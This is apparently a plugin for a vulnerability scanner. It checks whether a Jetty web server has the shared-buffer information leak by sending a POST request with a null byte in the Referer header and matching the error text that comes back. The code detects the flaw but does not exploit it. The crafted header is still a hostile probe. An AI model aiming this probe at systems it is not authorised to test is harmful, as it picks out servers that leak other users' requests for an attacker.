# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "Jetty Web Server 远程共享缓冲区信息泄漏漏洞",
        "description": "利用Jetty漏洞，攻击者远程获取其他用户的历史请求信息。",
    }

    def url(self) -> dict:
        r = self.request(
            method='post',
            path='./',
            headers={"Referer": "\x00"},
            timeout=15
        )
        if r.status_code == 400 and 'Illegal character 0x0 in state' in r.text:
            return {
                "LoopholeInfo": {"app": "Jetty", "name": "Jetty Web Server 远程共享缓冲区信息泄漏漏洞"}
            }
